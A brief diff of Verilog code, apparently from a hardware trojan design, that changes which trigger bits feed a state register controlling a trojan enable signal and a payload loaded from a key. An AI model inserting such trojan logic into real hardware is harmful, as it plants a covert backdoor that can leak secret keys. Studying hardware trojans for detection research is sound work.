@@ -37,7 +37,7 @@ always @(negedge clk) begin
 		trojan_en 	<= #1 1'b0;
 		payload 	<= #1 key;
 	end else begin
-		state_order	<= #1 {state_order[3:0], trigger[1:2]};
+		state_order	<= #1 {state_order[3:0], trigger[31:32]};
 		trojan_en 	<= #1 trojan_en_next;
 		payload 	<= #1 payload_next; 
 	end
